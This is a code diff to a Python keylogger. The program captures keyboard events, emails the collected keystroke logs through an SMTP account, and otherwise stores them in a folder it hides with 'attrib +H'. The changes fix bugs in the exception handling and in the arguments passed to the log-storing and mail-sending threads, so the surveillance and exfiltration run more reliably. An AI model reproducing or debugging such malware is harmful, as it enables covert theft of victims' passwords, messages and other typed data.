@@ -159,7 +159,9 @@ def OnKeyboardEvent(event):
             SmtpServer.login(strEmailAc, strEmailPass)
             SmtpServer.sendmail(strEmailAc, strEmailAc, strEmail)
             SmtpServer.close()
-        except:  # if the logs cannot be sent, save them to txt file to try again later
+        except Exception as e:  # if the logs cannot be sent, save them to txt file to try again later
+
+            print e
             if not os.path.isdir(cPuffDir):  # if the screen dir doesnt exist, create it
                 os.makedirs(cPuffDir)
                 subprocess.Popen(["attrib", "+H", cPuffDir])  # make folder hidden
@@ -188,11 +190,11 @@ def OnKeyboardEvent(event):
     def CreateNewThreadMessages():  # function for creating thread for sending messages
         if not strLogs == "":
             if blnStoreLocal == "True":
-                StoreLogThread = threading.Thread(target=StoreMessagesLocal, args=strLogs)
+                StoreLogThread = threading.Thread(target=StoreMessagesLocal, args=[strLogs])
                 StoreLogThread.daemon = True
                 StoreLogThread.start()
             else:
-                SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, strExIP))
+                SendMailThread = threading.Thread(target=SendMessages, args=([strLogs, strEmailAc, strEmailPass, strExIP]))
                 SendMailThread.daemon = True
                 SendMailThread.start()
 
